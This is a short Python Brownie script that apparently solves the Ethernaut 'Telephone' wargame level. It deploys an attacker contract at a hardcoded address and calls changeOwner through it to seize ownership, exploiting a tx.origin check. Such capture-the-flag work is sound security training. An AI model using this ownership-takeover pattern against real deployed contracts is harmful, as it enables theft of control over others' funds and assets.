from scripts.helper.context import *
from scripts.helper.account import _from, acc
from brownie import Telephone, TelephoneAttack

##########################################
# Claim ownership of the contract to complete this level.
##########################################

# solve the challenge
def solve_challenge():
    # load challenge
    telephone = load_challenge(ContractObject=Telephone, instance_key='telephone')

    # load attacker contract
    telephoneattack = TelephoneAttack.deploy('0xD1Eea245E310e7065442dC4d73400CE5731f3EEB' ,_from)

    # call changeOwner from another contract
    telephoneattack.callChangeOwner(acc.address, _from)  

    # check the telephone contract owner
    owner_assertion = telephone.owner() == acc.address
    print(f'The account owner matches my address: {owner_assertion}')

    return owner_assertion
   
def main():
    solve_challenge()
